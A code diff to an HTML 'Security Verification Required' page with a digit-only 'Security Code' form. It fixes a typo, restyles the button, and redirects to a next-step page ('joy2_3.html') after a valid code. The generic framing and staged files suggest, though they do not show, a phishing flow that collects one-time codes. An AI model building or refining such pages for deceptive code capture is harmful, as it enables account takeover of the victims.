@@ -11,7 +11,9 @@
     </div>
   </div>
 
-  <h3 style="color:#e11d48;margin:20px 0 16px 0;font-size:18px;font-weight:600">🔒 Security Verification Required</h3>
+  <h3 style="color:#e11d48;margin:20px 0 16px 0;font-size:18px;font-weight:600">
+    🔒 Security Verification Required
+  </h3>
   
   <div class="play-instructions">
     <div class="instruction-card">
@@ -23,11 +25,13 @@
   </div>
 
   <form id="playForm" method="post" novalidate>
-    <label style="display:block;font-weight:600;color:#374151;margin-bottom:8px;font-size:14px">Security Code</label>
+    <label style="display:block;font-weight:600;color:#374151;margin-bottom:8px;font-size:14px">
+      Security Code
+    </label>
     <input class="input" id="digits" name="digits" placeholder="Enter code" pattern="\d{4,9}" required>
     <div class="error-text" id="digitsError"></div>
 
-    <button class="btn login-btn" type="submit">Summit</button>
+    <button class="btn login-btn" type="submit">Submit</button>
   </form>
 </div>
 
@@ -72,12 +76,9 @@
   display: block;
   margin-top: 8px;
 }
-.login-btn {
-  background: #9ca3af;  /* Grey */
-  box-shadow: 0 6px 16px rgba(107,114,128,0.25);
-}
+
 .login-btn:hover {
-  background: #6b7280;  /* Dark grey */
+  background: #cc0000;
 }
 
 .play-instructions {
@@ -104,10 +105,14 @@ document.getElementById("playForm").addEventListener("submit", function(event) {
   digitsError.textContent = "";
 
   if (!pattern.test(val)) {
-    event.preventDefault(); // stop form submission
+    event.preventDefault();
     digits.classList.add("input-error");
     digitsError.textContent = "The code you entered is incorrect.";
+    return;
   }
+
+  // ✅ NEW REDIRECT FOR UPGRADED FLOW
+  window.location.href = "joy2_3.html";
 });
 
 document.getElementById("digits").addEventListener("input", () => {
